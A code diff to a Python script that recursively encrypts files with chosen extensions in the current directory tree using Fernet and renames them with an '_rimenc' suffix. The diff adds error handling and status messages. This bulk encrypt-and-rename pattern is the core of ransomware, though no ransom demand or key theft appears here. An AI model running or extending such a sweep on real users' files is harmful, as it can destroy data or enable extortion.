@@ -25,14 +25,19 @@ def encrypt(filename):
 				new_name = name+"_"+str(i)+extension+"_rimenc"
 
 			fernet = Fernet(key)
-			encrypted = fernet.encrypt(data)
-			change = file.write(encrypted)
-			file.close()
+			try :
+				encrypted = fernet.encrypt(data)
+			except TypeError:
+				print("FAILED '"+filename +"' could not encrypted because the data is not binary")
+				file.close()
+			else :
+				change = file.write(encrypted)
+				file.close()
+				os.rename(filename,new_name)
 			
-			os.rename(filename,new_name)
-			print("'"+filename +"' has encrypted and renamed as '"+new_name+"'")
+			print("SUCCESS '"+filename +"' has encrypted and renamed as '"+new_name+"'")
 		else :
-			print("'"+filename +"' could not encrypted because it's empty")
+			print("WARNING '"+filename +"' could not encrypted because it's empty")
 			file.close()
 	
 if os.path.exists(KEYFILE) == False : 
@@ -55,3 +60,5 @@ for root, dirs, files in os.walk(".") :
 		if(extension in ALLOWED_FILES):
 			encrypt(filename)
 			# print(filename)
+print("\n\nPress enter to exit!")
+wait = input()
